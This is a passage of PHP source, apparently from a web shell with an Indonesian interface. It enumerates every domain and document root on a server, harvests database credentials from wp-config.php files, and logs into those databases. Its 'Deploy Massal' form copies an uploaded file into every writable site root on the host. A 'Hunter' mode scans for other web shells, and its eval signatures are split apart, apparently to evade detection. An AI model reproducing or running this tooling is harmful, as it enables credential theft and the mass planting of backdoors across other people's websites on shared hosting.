        if (wid_domain_like($n) && !in_array($n, $names2)) $names2[] = $n;
    }
    if (!$names2) {
        $dm = wid_hosting_docroot_domain($real);
        if (wid_domain_like($dm)) $names2[] = $dm;
    }
    if (!$names2) return;
    $found[$key] = array('path'=>$real,'names'=>$names2,'source'=>array($source),'current'=>(($currentRoot !== false) && wid_nslash($real) === wid_nslash($currentRoot)) ? 1 : 0);
}
function wid_scan_domain_children(&$found, $basePath, $currentRoot, $source, $skip = array()) {
    $real = @realpath($basePath);
    if ($real === false || !@is_dir($real) || !@is_readable($real)) return;
    $names = @scandir($real);
    if ($names === false) return;
    foreach ($names as $name) {
        if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
        if ($skip && isset($skip[strtolower($name)])) continue;
        if (!wid_domain_like($name)) continue;
        $hostDir = $real . DIRECTORY_SEPARATOR . $name;
        if (!@is_dir($hostDir) || @is_link($hostDir)) continue;
        $added = false;
        foreach (wid_web_docroot_markers() as $marker) {
            $candidate = $hostDir . DIRECTORY_SEPARATOR . $marker;
            if (@is_dir($candidate) && !@is_link($candidate)) {
                wid_add_domain_root($found, $candidate, $source, $currentRoot, array($name));
                $added = true; break;
            }
        }
        if (!$added && wid_looks_like_webroot($hostDir)) {
            wid_add_domain_root($found, $hostDir, $source . '-root', $currentRoot, array($name));
        }
    }
}
function wid_scan_account_home(&$found, $scanHome, $currentRoot) {
    foreach (wid_account_bucket_names() as $bucket) {
        wid_scan_domain_children($found, $scanHome . DIRECTORY_SEPARATOR . $bucket, $currentRoot, $bucket . '-dir');
    }
    wid_scan_domain_children($found, $scanHome, $currentRoot, 'home-domain-folder', wid_domain_skip_home());
    foreach (wid_web_docroot_markers() as $marker) {
        $direct = $scanHome . DIRECTORY_SEPARATOR . $marker;
        if (!@is_dir($direct) || @is_link($direct)) continue;
        wid_add_domain_root($found, $direct, 'account-' . $marker, $currentRoot);
        if ($marker === 'public_html') {
            wid_scan_domain_children($found, $direct, $currentRoot, 'nested-subdomain', wid_domain_skip_nested());
        }
    }
}
function wid_hosting_layout_scan(&$found, $scanHome, $currentRoot) {
    $skipNames = array('node_modules'=>1,'vendor'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backups'=>1,'backup'=>1,'sessions'=>1,'proc'=>1,'clients'=>1,'lscache'=>1);
    $queue = array(array($scanHome, 0));
    $seen = array(); $visited = 0; $maxVisited = 2000; $maxDepth = 7;
    $bfsStart = microtime(true);
    while (count($queue) && $visited < $maxVisited) {
        if (($visited % 50) === 0 && ((microtime(true) - $bfsStart) > 25 || (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']))) break;
        $item = array_shift($queue); $dir = $item[0]; $depth = $item[1];
        $realDir = @realpath($dir);
        if ($realDir === false || !@is_dir($realDir) || !@is_readable($realDir)) continue;
        $seenKey = wid_nslash($realDir);
        if (DIRECTORY_SEPARATOR === '\\') $seenKey = strtolower($seenKey);
        if (isset($seen[$seenKey])) continue;
        $seen[$seenKey] = true; $visited++;
        $layoutDomain = wid_hosting_docroot_domain($realDir);
        if ($layoutDomain !== '') {
            wid_add_domain_root($found, $realDir, 'hosting-layout', $currentRoot, array($layoutDomain));
            if (wid_is_main_public_html($realDir)) wid_scan_domain_children($found, $realDir, $currentRoot, 'nested-subdomain', wid_domain_skip_nested());
            continue;
        }
        if ($depth >= $maxDepth) continue;
        $names = @scandir($realDir); if ($names === false) continue;
        foreach ($names as $name) {
            if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
            if (isset($skipNames[strtolower($name)])) continue;
            $child = $realDir . DIRECTORY_SEPARATOR . $name;
            if (@is_dir($child) && !@is_link($child)) $queue[] = array($child, $depth + 1);
        }
    }
}
function wid_conf_vhosts() {
    $out = array();
    $dirs = array('/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/apache2/vhosts.d','/etc/httpd/conf.d','/etc/httpd/vhosts.d','/etc/httpd/sites-enabled','/etc/nginx/sites-enabled','/etc/nginx/sites-available','/etc/nginx/conf.d','/etc/lighttpd/conf-enabled','/usr/local/etc/apache24/Includes');
    $files = array();
    foreach ($dirs as $d) {
        if (!@is_dir($d)) continue;
        $e = @scandir($d); if (!is_array($e)) continue;
        foreach ($e as $f) {
            if ($f === '.' || $f === '..') continue;
            $p = $d . '/' . $f;
            if (@is_file($p) && !@is_link($p)) $files[] = $p;
            if (count($files) >= 200) break 2;
        }
    }
    foreach (array('/etc/apache2/apache2.conf','/etc/httpd/conf/httpd.conf','/etc/apache2/httpd.conf') as $p) if (@is_file($p)) $files[] = $p;
    foreach ($files as $p) wid_parse_vhost_file($p, $out);
    return $out;
}
function wid_parse_vhost_file($path, &$out) {
    $c = @file_get_contents($path);
    if (!is_string($c) || $c === '' || strlen($c) > 1048576) return;
    $lines = explode("\n", $c); $root = ''; $names = array();
    foreach ($lines as $ln) {
        $ln = trim($ln);
        if ($ln === '' || $ln[0] === '#') continue;
        if (stripos($ln, 'DocumentRoot') !== false && preg_match('/DocumentRoot\s+["\']?([^"\'#\s]+)/i', $ln, $m)) $root = $m[1];
        if (preg_match('/^\s*ServerName\s+["\']?([^"\'\s]+)/i', $ln, $m)) {
            $h = strtolower($m[1]);
            if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
        }
        if (preg_match('/^\s*ServerAlias\s+(.+)$/i', $ln, $m)) {
            foreach (preg_split('/\s+/', trim($m[1])) as $h) {
                $h = strtolower(trim($h, "\"' \t"));
                if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
            }
        }
        if (stripos($ln, 'server_name') !== false && preg_match('/^\s*server_name\s+(.+?);/i', $ln, $m)) {
            foreach (preg_split('/\s+/', trim($m[1])) as $h) {
                if (wid_domain_like($h) && !in_array($h, $names)) $names[] = $h;
            }
        }
        if (stripos($ln, 'root') !== false && preg_match('/^\s*root\s+["\']?([^"\';#]+)/i', $ln, $m)) $root = trim($m[1]);
    }
    $root = wid_normalize_root($root);
    if ($root === '' || !$names) return;
    $out[] = array('root'=>$root,'names'=>$names,'source'=>'conf');
}
function wid_wp_config_domains($roots) {
    $out = array(); $configs = array();
    $seen = array(); $visited = 0;
    $skipNames = array('node_modules'=>1,'vendor'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backups'=>1,'backup'=>1,'lscache'=>1);
    foreach ($roots as $root) {
        if (count($configs) >= 25) break;
        $root = trim((string)$root); if ($root === '') continue;
        $queue = array(array($root, 0));
        while (count($queue)) {
            if (count($configs) >= 25) break;
            if (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']) break;
            $item = array_shift($queue); $dir = $item[0]; $depth = $item[1];
            $realDir = @realpath($dir);
            if ($realDir === false || !@is_dir($realDir) || !@is_readable($realDir)) continue;
            $key = wid_nslash($realDir);
            if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
            if (isset($seen[$key])) continue;
            $seen[$key] = true;
            if (++$visited > 1500) break 2;
            $cfg = $realDir . DIRECTORY_SEPARATOR . 'wp-config.php';
            if (@is_file($cfg)) $configs[$cfg] = $realDir;
            if ($depth >= 4) continue;
            $names = @scandir($realDir); if ($names === false) continue;
            foreach ($names as $name) {
                if ($name === '.' || $name === '..' || $name === '' || $name[0] === '.') continue;
                if (isset($skipNames[strtolower($name)])) continue;
                $child = $realDir . DIRECTORY_SEPARATOR . $name;
                if (@is_dir($child) && !@is_link($child)) $queue[] = array($child, $depth + 1);
            }
        }
    }
    $probes = 0;
    foreach ($configs as $cfg => $docroot) {
        if ($probes >= 6) break;
        if (isset($GLOBALS['WID_SCAN_DEADLINE']) && microtime(true) > $GLOBALS['WID_SCAN_DEADLINE']) break;
        foreach (wid_wp_domains_from_config($cfg, $docroot, $probes) as $d) $out[] = array('root'=>$docroot,'names'=>array($d),'source'=>'wp');
    }
    return $out;
}
function wid_wp_domains_from_config($file, $docroot, &$probes) {
    $domains = array();
    $c = @file_get_contents($file);
    if (!is_string($c) || $c === '' || strlen($c) > 1048576) return $domains;
    $dbname = $dbuser = $dbpass = $dbhost = $prefix = '';
    if (preg_match("/DB_NAME\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbname = $m[1];
    if (preg_match("/DB_USER\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbuser = $m[1];
    if (preg_match("/DB_PASSWORD\s*,\s*['\"]([^'\"]*)['\"]/", $c, $m)) $dbpass = $m[1];
    if (preg_match("/DB_HOST\s*,\s*['\"]([^'\"]+)['\"]/", $c, $m)) $dbhost = $m[1];
    if (preg_match("/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $c, $m)) $prefix = $m[1];
    if ($prefix === '') $prefix = 'wp_';
    if ($dbname !== '' && $dbuser !== '') {
        $probes++;
        foreach (wid_wp_db_domains($dbname, $dbuser, $dbpass, $dbhost, $prefix) as $d) if (!in_array($d, $domains)) $domains[] = $d;
    }
    if (!$domains) {
        foreach (array(basename($docroot), basename(dirname($docroot))) as $h) {
            if (wid_domain_like($h) && !in_array(strtolower($h), $domains)) $domains[] = strtolower($h);
        }
    }
    return $domains;
}
function wid_wp_db_domains($db, $u, $p, $h, $prefix) {
    static $downHosts = array();
    $domains = array();
    $h = ($h === '') ? 'localhost' : $h;
    if ($h === 'localhost') $h = '127.0.0.1';
    $hkey = strtolower($h);
    if (isset($downHosts[$hkey])) return $domains;
    $down = false;

    if (class_exists('PDO')) {
        $drivers = PDO::getAvailableDrivers();
        if (in_array('mysql', $drivers)) {
            try {
                $pdo = @new PDO(
                    'mysql:host=' . $h . ';dbname=' . $db . ';charset=utf8',
                    $u, $p,
                    array(
                        PDO::ATTR_TIMEOUT => 2,
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                    )
                );
                $tbl = '';
                $st = $pdo->query('SHOW TABLES LIKE ' . $pdo->quote($prefix . 'options'));
                if ($st) { $row = $st->fetch(PDO::FETCH_NUM); if ($row) $tbl = (string)$row[0]; }
                if ($tbl === '') {
                    foreach ($pdo->query('SHOW TABLES', PDO::FETCH_NUM) as $row) {
                        $t = (string)$row[0];
                        if (preg_match('/^[A-Za-z0-9_]+options$/', $t)) { $tbl = $t; break; }
                    }
                }
                if ($tbl !== '') {
                    $st2 = $pdo->prepare('SELECT option_value FROM `' . $tbl . '` WHERE option_name IN ("home","siteurl") LIMIT 2');
                    $st2->execute();
                    foreach ($st2->fetchAll(PDO::FETCH_ASSOC) as $r2) {
                        $host = @parse_url($r2['option_value'], PHP_URL_HOST);
                        if ($host && wid_domain_like($host) && !in_array($host, $domains)) $domains[] = $host;
                    }
                }
            } catch (Exception $e) {
                if (in_array((int)$e->getCode(), array(2002,2003,2004,2005,2006))) $down = true;
            }
        }
    }

    if (!$domains && !$down && function_exists('mysqli_connect')) {
        try {
            $m = @mysqli_init();
            if ($m) {
                @mysqli_options($m, MYSQLI_OPT_CONNECT_TIMEOUT, 2);
                if (@mysqli_real_connect($m, $h, $u, $p, $db)) {
                    $tbl = '';
                    $res = @mysqli_query($m, 'SHOW TABLES');
                    if ($res) {
                        while ($row = @mysqli_fetch_row($res)) {
                            $t = (string)$row[0];
                            if (preg_match('/^[A-Za-z0-9_]+options$/', $t) && (strpos($t, $prefix) === 0 || $prefix === '')) { $tbl = $t; break; }
                        }
                    }
                    if ($tbl !== '') {
                        $res2 = @mysqli_query($m, 'SELECT option_value FROM `' . $tbl . '` WHERE option_name IN ("home","siteurl") LIMIT 2');
                        if ($res2) {
                            while ($row2 = @mysqli_fetch_row($res2)) {
                                $host = @parse_url((string)$row2[0], PHP_URL_HOST);
                                if ($host && wid_domain_like($host) && !in_array($host, $domains)) $domains[] = $host;
                            }
                        }
                    }
                    @mysqli_close($m);
                } else {
                    $errno = @mysqli_connect_errno();
                    if (in_array((int)$errno, array(2002,2003,2004,2005,2006))) $down = true;
                }
            }
        } catch (Exception $e) {}
    }

    if ($down) $downHosts[$hkey] = true;
    return $domains;
}
function wid_detect_domains() {
    global $WID_SCAN_ROOTS;
    if (function_exists('set_time_limit')) @set_time_limit(120);
    if (function_exists('ini_set')) @ini_set('default_socket_timeout', '5');
    $GLOBALS['WID_SCAN_DEADLINE'] = microtime(true) + 20.0;
    $found = array();
    $currentRoot = false;
    foreach (array('DOCUMENT_ROOT','CONTEXT_DOCUMENT_ROOT') as $envKey) {
        if (!empty($_SERVER[$envKey])) {
            $r = @realpath($_SERVER[$envKey]);
            if ($r !== false && @is_dir($r)) {
                if ($currentRoot === false) $currentRoot = $r;
                wid_add_domain_root($found, $r, 'current', $currentRoot);
            }
        }
    }
    if ($currentRoot === false) {
        $self = @realpath(dirname(__FILE__));
        if ($self !== false) { $currentRoot = $self; wid_add_domain_root($found, $self, 'script', $currentRoot); }
    }
    foreach (wid_conf_vhosts() as $s) wid_add_domain_root($found, $s['root'], 'conf', $currentRoot, $s['names']);
    $homeCandidates = array();
    if (function_exists('getenv')) { $envHome = @getenv('HOME'); if ($envHome) $homeCandidates[] = $envHome; }
    if (!empty($_SERVER['HOME'])) $homeCandidates[] = $_SERVER['HOME'];
    foreach (array($currentRoot, @realpath(dirname(__FILE__))) as $hint) {
        if ($hint === false || $hint === null || $hint === '') continue;
        foreach (wid_account_home_candidates_from_path($hint) as $cand) $homeCandidates[] = $cand;
    }
    if ($WID_SCAN_ROOTS !== '') {
        foreach (explode(',', $WID_SCAN_ROOTS) as $cfgRoot) {
            $cfgRoot = trim($cfgRoot);
            if ($cfgRoot !== '') $homeCandidates[] = $cfgRoot;
        }
    }
    $scanHomes = array(); $seenHomes = array();
    foreach ($homeCandidates as $home) {
        $home = trim((string)$home); if ($home === '') continue;
        $r = @realpath($home);
        if ($r === false || !@is_dir($r) || !@is_readable($r)) continue;
        $key = wid_nslash($r);
        if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
        if (isset($seenHomes[$key])) continue;
        $seenHomes[$key] = true; $scanHomes[] = $r;
    }
    $wpScanRoots = array();
    if ($currentRoot !== false) $wpScanRoots[] = $currentRoot;
    $selfDir = @realpath(dirname(__FILE__));
    if ($selfDir !== false) $wpScanRoots[] = $selfDir;
    foreach ($found as $f) $wpScanRoots[] = $f['path'];
    foreach ($scanHomes as $sh) $wpScanRoots[] = $sh;
    foreach (wid_wp_config_domains($wpScanRoots) as $s) wid_add_domain_root($found, $s['root'], 'wp', $currentRoot, $s['names']);
    foreach ($scanHomes as $scanHome) {
        wid_scan_account_home($found, $scanHome, $currentRoot);
        wid_hosting_layout_scan($found, $scanHome, $currentRoot);
    }
    $rows = array();
    foreach ($found as $key => $entry) {
        if (!$entry['names']) continue;
        $rows[] = array(
            'domain'=>$entry['names'][0],
            'aliases'=>array_slice($entry['names'], 1),
            'docroot'=>$entry['path'],
            'writable'=>@is_writable($entry['path']),
            'readable'=>@is_readable($entry['path']),
            'source'=>implode(',', $entry['source']),
            'current'=>$entry['current'],
        );
        if (count($rows) >= 150) break;
    }
    usort($rows, function ($a, $b) {
        if ($a['current'] !== $b['current']) return $b['current'] - $a['current'];
        return strcmp($a['domain'], $b['domain']);
    });
    return $rows;
}
function wid_deploy_file($src, $name, $rows) {
    $report = array();
    $name = basename($name);
    if ($name === '' || $name === '.' || $name === '..') {
        $report[] = array('domain'=>'-','url'=>'-','docroot'=>'-','status'=>'gagal','detail'=>'Nama file tujuan tidak valid.');
        return $report;
    }
    $srcReal = @realpath($src);
    $seen = array(); $seenDom = array();
    foreach ($rows as $row) {
        $dom = (string)$row['domain'];
        $url = ($dom !== '' && $dom !== '-') ? $dom . '/' . $name : '-';
        $domKey = strtolower(trim($dom));
        if ($domKey !== '' && isset($seenDom[$domKey])) continue;
        if ($domKey !== '') $seenDom[$domKey] = true;
        $rp = wid_normalize_root($row['docroot']);
        if ($rp === '') {
            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$row['docroot'],'status'=>'gagal','detail'=>'Docroot tidak valid/tidak ada.');
            continue;
        }
        if (isset($seen[$rp])) continue;
        $seen[$rp] = true;
        $dest = $rp . DIRECTORY_SEPARATOR . $name;
        $destReal = @realpath($dest);
        if ($destReal !== false && $srcReal !== false && $destReal === $srcReal) {
            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'skip','detail'=>'File sumber itu sendiri.');
            continue;
        }
        if (!@is_dir($rp)) {
            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'Docroot bukan direktori.');
            continue;
        }
        if (!@is_writable($rp)) {
            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'Docroot tidak writable.');
            continue;
        }
        $existed = @file_exists($dest);
        if (!@copy($src, $dest)) {
            $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'gagal','detail'=>'copy() gagal (permission/disk).');
            continue;
        }
        $report[] = array('domain'=>$dom,'url'=>$url,'docroot'=>$rp,'status'=>'ok','detail'=>$existed ? 'ditimpa' : 'baru');
    }
    return $report;
}

// Handler
$domain_rows = array(); $domain_scan_done = false;
$deploy_done = false; $deploy_summary = ''; $deploy_report = array(); $detect_error = '';

if (isset($_POST['action']) && $_POST['action'] === 'domain_detect') {    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
    catch (Exception $e) { $detect_error = 'Scan domain gagal: ' . $e->getMessage(); }
    catch (Throwable $e) { $detect_error = 'Scan domain gagal (' . get_class($e) . '): ' . $e->getMessage(); }
}
if (isset($_POST['action']) && $_POST['action'] === 'deploy_massal') {
    try { $domain_rows = wid_detect_domains(); $domain_scan_done = true; }
    catch (Exception $e) { $detect_error = 'Scan domain gagal: ' . $e->getMessage(); }
    catch (Throwable $e) { $detect_error = 'Scan domain gagal (' . get_class($e) . '): ' . $e->getMessage(); }
    $deploy_done = true;
    if ($detect_error === '' && isset($_FILES['deploy_file']) && is_array($_FILES['deploy_file']) && $_FILES['deploy_file']['error'] === UPLOAD_ERR_OK) {
        $df = $_FILES['deploy_file'];
        $dname = basename($df['name']);
        $deploy_report = wid_deploy_file($df['tmp_name'], $dname, $domain_rows);
        $okN = 0; $failN = 0;
        foreach ($deploy_report as $dr) { if ($dr['status'] === 'ok') $okN++; else $failN++; }
        $deploy_summary = 'Deploy "' . h($dname) . '": ' . $okN . ' target ok, ' . $failN . ' gagal/skip dari ' . count($deploy_report) . ' tujuan unik.';
    } elseif ($detect_error === '') {
        $err = isset($_FILES['deploy_file']) ? (int)$_FILES['deploy_file']['error'] : 4;
        $deploy_summary = 'Upload gagal (kode error ' . $err . '). Pilih file dulu.';
    }
}

// ---------- SEARCH + HUNT ----------
$hunt_error = '';
$hunt_state = (isset($_SESSION['rct_hunt']) && is_array($_SESSION['rct_hunt'])) ? $_SESSION['rct_hunt'] : null;

if (isset($_POST['action']) && $_POST['action'] === 'hunt_scan') {
    $hunt_root = isset($_POST['hroot']) ? trim($_POST['hroot']) : '';
    $hroot_real = $hunt_root !== '' ? @realpath($hunt_root) : false;
    $hunt_mode = isset($_POST['hmode']) ? (string)$_POST['hmode'] : 'name';
    if (!in_array($hunt_mode, array('name', 'content', 'recent', 'hunter'), true)) $hunt_mode = 'name';
    $hpat = isset($_POST['hpattern']) ? (string)$_POST['hpattern'] : '';
    $hext = isset($_POST['hext']) ? trim($_POST['hext']) : '';
    $skip_heavy = !empty($_POST['hskip']);

    if ($hroot_real === false || !@is_dir($hroot_real) || !@is_readable($hroot_real)) {
        $hunt_error = 'Root tidak valid / tidak bisa dibaca: ' . h($hunt_root);
    } elseif ($hunt_mode === 'content' && $hpat === '') {
        $hunt_error = 'Mode Isi butuh pattern.';
    } else {
        $hunt_exts = array();
        foreach (explode(',', $hext) as $e) { $e = strtolower(trim(ltrim($e, '.'))); if ($e !== '') $hunt_exts[] = $e; }
        $sigs = array(
            'ev'.'al(' => '/\b'.'eval'.'\s*\(/i',
            'assert(' => '/\bassert\s*\(/i',
            'b64' => '/base64_'.'decode\s*\(/i',
            'unpack' => '/gz(inflate|uncompress|'.'de'.'code)\s*\(/i',
            'preg_/e' => '/preg_replace\s*\([^)]*\/[a-z]*e[a-z]*[\'"]/i',
            'exec-family' => '/\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/i',
            'superglobal' => '/\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'create_function' => '/create_function\s*\(/i',
            'include-user' => '/\b(include|require)(_once)?\s*\(?\s*\$_(POST|GET|REQUEST|COOKIE)/i',
        );
        $deadline = microtime(true) + 20.0;
        $t0 = microtime(true);
        $rows = array(); $scanned = 0; $truncated = false;

        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($hroot_real, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY,
                RecursiveIteratorIterator::CATCH_GET_CHILD
            );
            foreach ($it as $file) {
                if (microtime(true) > $deadline || count($rows) >= 400) { $truncated = true; break; }
                if (!$file->isFile()) continue;
                $path = $file->getPathname();
                if ($skip_heavy && preg_match('#[\\\\/](node_modules|vendor|\.git|\.svn|logs?|cache|caches)[\\\\/]#i', $path)) continue;
                $scanned++;
                $base = $file->getBasename();
                $ext = strtolower(substr(strrchr($base, '.'), 1));
                if ($hunt_exts && !in_array($ext, $hunt_exts, true)) continue;
                if ($hunt_mode === 'name' && $hpat !== '') {
                    if (strpbrk($hpat, '*?') !== false) {
                        $flag = defined('FNM_CASEFOLD') ? FNM_CASEFOLD : 0;
                        if (!@fnmatch('*' . $hpat . '*', $base, $flag)) continue;
                    } elseif (stripos($base, $hpat) === false) continue;
                }
                $size = (int)$file->getSize();
                $mtime = (int)$file->getMTime();
                $line_no = 0; $snippet = ''; $sig = '';
                if ($hunt_mode === 'content' || $hunt_mode === 'hunter') {
                    if ($size === 0 || $size > 3145728) continue;
                    $fh = @fopen($path, 'rb'); if (!$fh) continue;
                    $chunk = @fread($fh, 400000); @fclose($fh);
                    if ($chunk === false || $chunk === '') continue;
                    if (strpos(substr($chunk, 0, 8192), "\0") !== false) continue;
                    $lines = preg_split("/\r\n|\n|\r/", $chunk);
                    foreach ($lines as $i => $ln) {
                        if ($hunt_mode === 'content') {
                            if (stripos($ln, $hpat) !== false) { $line_no = $i + 1; $snippet = $ln; break; }
                        } else {
                            foreach ($sigs as $sname => $sre) {
                                if (@preg_match($sre, $ln)) { $line_no = $i + 1; $snippet = $ln; $sig = $sname; break 2; }
                            }
                        }
                    }
                    if ($snippet === '') continue;
                    $snippet = trim(preg_replace('/\s+/', ' ', $snippet));
                    if (strlen($snippet) > 200) $snippet = substr($snippet, 0, 200) . '...';
                }
                $rows[] = array('path' => $path, 'size' => $size, 'mtime' => $mtime, 'line' => $line_no, 'snippet' => $snippet, 'sig' => $sig);
            }
        } catch (Exception $e) {
            $hunt_error = 'Scan gagal: ' . h($e->getMessage());
        } catch (Throwable $e) {
            $hunt_error = 'Scan gagal: ' . h($e->getMessage());
        }

        if ($hunt_mode === 'recent') {
            usort($rows, function ($a, $b) { return $b['mtime'] - $a['mtime']; });
            $rows = array_slice($rows, 0, 60);
        }
        $hunt_state = array(
            'root' => $hroot_real, 'mode' => $hunt_mode, 'pattern' => $hpat,
            'rows' => $rows, 'scanned' => $scanned,
            'elapsed' => round(microtime(true) - $t0, 1), 'truncated' => $truncated,
        );
        $_SESSION['rct_hunt'] = $hunt_state;
    }
}
?>
<?php if ($tab === 'domain'): ?>
<div class="box">
    <div class="name">Domain Detect</div>
    <div class="muted" style="margin-bottom:10px;">
        Scan vhost Apache/Nginx.
    </div>
    <form method="post">
        <input type="hidden" name="action" value="domain_detect">
        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
        <input type="submit" class="btn btn-green" value="Deteksi Domain">
    </form>
    <?php if ($detect_error !== ''): ?>
        <div class="msg" style="color:#ff9da7;margin-top:10px;"><?php echo h($detect_error); ?></div>
    <?php endif; ?>
    <?php if ($domain_scan_done): ?>
        <div style="margin-top:12px;">
            <?php if (!$domain_rows): ?>
                <div class="msg">Tidak ada domain/docroot yang terdeteksi.</div>
            <?php else: ?>
                <div class="muted" style="margin-bottom:6px;">Terdeteksi <b style="color:#7ee787;"><?php echo count($domain_rows); ?></b> docroot:
                    <?php $dom_copy = array(); foreach ($domain_rows as $dc) { if (!empty($dc['domain']) && !in_array($dc['domain'], $dom_copy)) $dom_copy[] = $dc['domain']; if (!empty($dc['aliases'])) { foreach ((array)$dc['aliases'] as $da) { if ($da !== '' && !in_array($da, $dom_copy)) $dom_copy[] = $da; } } } ?>
                    <?php if ($dom_copy): ?><button type="button" class="btn" style="margin-left:8px;padding:2px 8px;font-size:10px;" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", $dom_copy))); ?>, 'tersalin')">Salin semua domain</button><?php endif; ?>
                </div>
                <table>
                    <thead><tr><th>Domain</th><th>Docroot</th><th>Writable</th><th>Source</th></tr></thead>
                    <tbody>
                    <?php foreach ($domain_rows as $dr): ?>
                        <tr>
                            <td>
                                <?php echo h($dr['domain']); ?>
                                <button type="button" class="btn" style="padding:1px 6px;font-size:10px;" onclick="widCopyText(this, <?php echo h(json_encode($dr['domain'])); ?>, 'copied')">copy</button>
                                <?php if (!empty($dr['aliases'])): ?><br><small style="color:#8e99ab;"><?php foreach ((array)$dr['aliases'] as $daI => $daV): ?><?php echo $daI > 0 ? ', ' : ''; ?><?php echo h($daV); ?> <button type="button" class="btn" style="padding:0 4px;font-size:9px;" onclick="widCopyText(this, <?php echo h(json_encode($daV)); ?>, 'ok')">copy</button><?php endforeach; ?></small><?php endif; ?>
                                <?php if (!empty($dr['current'])): ?> <small style="color:#e3b341;">(aktif)</small><?php endif; ?>
                            </td>
                            <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($dr['docroot']); ?></td>
                            <td><?php echo $dr['writable'] ? '<span style="color:#7ee787;">Ya</span>' : '<span style="color:#ff7b72;">Tidak</span>'; ?></td>
                            <td style="font-size:11px;"><?php echo h($dr['source']); ?></td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
    <?php endif; ?>
</div>

<div class="box">
    <div class="name">Deploy Massal</div>
    <div class="muted" style="margin-bottom:10px;">
        Salin satu file ke semua docroot.
    </div>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="deploy_massal">
        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
        <input type="file" name="deploy_file" required>
        <input type="submit" class="btn btn-red" value="Deploy" onclick="return confirm('Deploy file ini ke semua docroot?');">
    </form>
    <?php if ($deploy_done): ?>
        <?php if ($deploy_summary !== ''): ?><div class="msg" style="margin-top:10px;"><?php echo h($deploy_summary); ?></div><?php endif; ?>
        <?php if ($deploy_report): ?>
            <?php $copyUrls = array(); foreach ($deploy_report as $cr) { if ($cr['url'] !== '-') $copyUrls[] = 'http://' . $cr['url']; } ?>
            <?php if ($copyUrls): ?>
                <div style="margin-top:8px;"><button type="button" class="btn" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", $copyUrls))); ?>, 'tersalin')">Salin Semua URL</button></div>
            <?php endif; ?>
            <div style="margin-top:10px;">
                <table>
                    <thead><tr><th>Domain</th><th>URL</th><th>Docroot</th><th>Status</th><th>Detail</th></tr></thead>
                    <tbody>
                    <?php foreach ($deploy_report as $rr): ?>
                        <tr>
                            <td><?php echo h($rr['domain']); ?></td>
                            <td style="word-break:break-all;">
                                <?php if ($rr['url'] !== '-'): ?>
                                    <a href="http://<?php echo h($rr['url']); ?>" target="_blank" rel="noopener"><?php echo h($rr['url']); ?></a>
                                    <button type="button" class="btn" onclick="widCopyText(this, <?php echo h(json_encode('http://' . $rr['url'])); ?>, 'tersalin')" style="padding:2px 6px;font-size:10px;">copy</button>
                                <?php else: ?>-<?php endif; ?>
                            </td>
                            <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($rr['docroot']); ?></td>
                            <td><?php echo $rr['status'] === 'ok' ? '<span style="color:#7ee787;">OK</span>' : h($rr['status']); ?></td>
                            <td style="font-size:11px;"><?php echo h($rr['detail']); ?></td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>
<?php endif; ?>
<?php if ($tab === 'hunt'): ?>
<div class="box">
    <div class="name">Search &amp; Hunt</div>
    <div class="muted" style="margin-bottom:10px;">
        File Finder, name, time, code.
    </div>
    <?php if ($hunt_error !== ''): ?>
        <div class="msg" style="color:#ff9da7;"><?php echo $hunt_error; ?></div>
    <?php endif; ?>
    <form method="post">
        <input type="hidden" name="action" value="hunt_scan">
        <div class="form-grid">
            <div class="full"><div class="muted" style="margin-bottom:4px;">Root directory:</div>
                <input type="text" name="hroot" value="<?php echo h($hunt_state ? $hunt_state['root'] : $cwd_real); ?>" autocomplete="off"></div>
            <div><div class="muted" style="margin-bottom:4px;">Mode:</div>
                <select name="hmode" style="width:100%;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <option value="name">Nama file</option>
                    <option value="content">Isi file</option>
                    <option value="recent">Terbaru (mtime)</option>
                    <option value="hunter">Hunter (shell)</option>
                </select></div>
            <div><div class="muted" style="margin-bottom:4px;">Pattern / keyword:</div>
                <input type="text" name="hpattern" autocomplete="off" placeholder="mis: config / password / eval"></div>
            <div><div class="muted" style="margin-bottom:4px;">Ext (pisah koma, kosong = semua):</div>
                <input type="text" name="hext" value="php" autocomplete="off"></div>
